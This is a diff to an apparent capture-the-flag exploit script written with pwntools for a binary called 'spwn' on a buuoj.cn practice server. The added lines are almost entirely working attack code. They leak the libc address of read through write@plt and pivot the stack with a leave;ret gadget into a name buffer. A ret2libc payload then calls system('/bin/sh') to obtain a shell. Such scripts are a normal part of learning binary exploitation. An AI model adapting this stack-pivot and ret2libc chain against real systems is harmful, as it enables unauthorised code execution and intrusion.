@@ -28,14 +28,26 @@ uu64    = lambda data               :u64(data.ljust(8,'\0'))
 leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))
 
 context.log_level = 'DEBUG'
-binary = './pwn'
+binary = './spwn'
 context.binary = binary
 elf = ELF(binary)
-p = remote('node3.buuoj.cn',29776) if argv[1]=='r' else process(binary)
-libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
+p = remote('node3.buuoj.cn',25471) if argv[1]=='r' else process(binary)
 
 # start
+name = 0x804a300
+leave_ret = 0x8048511 # mov esp,ebp; pop ebp
+vuln = elf.sym['vul_function']
 
+payload = flat('a'*4,elf.plt['write'],vuln,1,elf.got['read'],4)
+sa('name?',payload)
+sa('say?',flat('a'*0x18,name,leave_ret))
+# esp = ebp; ebp = name
+read = uu32(r(4))
+leak('read',read)
+system,binsh = ret2libc(read,'read')
+payload = flat('a'*12,system,'a'*4,binsh)
+sa('name?',payload)
+sa('say?','blabla')
 # end
 
 itr()
